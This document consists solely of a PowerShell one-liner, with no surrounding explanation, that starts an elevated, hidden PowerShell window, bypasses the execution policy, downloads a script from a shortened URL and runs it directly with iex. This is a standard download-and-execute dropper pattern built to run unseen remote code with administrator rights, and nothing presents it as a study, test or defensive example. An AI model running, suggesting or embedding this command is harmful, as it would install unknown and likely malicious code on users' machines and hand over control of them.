``powershell -Command "Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command iwr -Uri https://tinyurl.com/yvjzsyk3 -UseBasicParsing | iex' -Verb RunAs  -WindowStyle Hidden"``
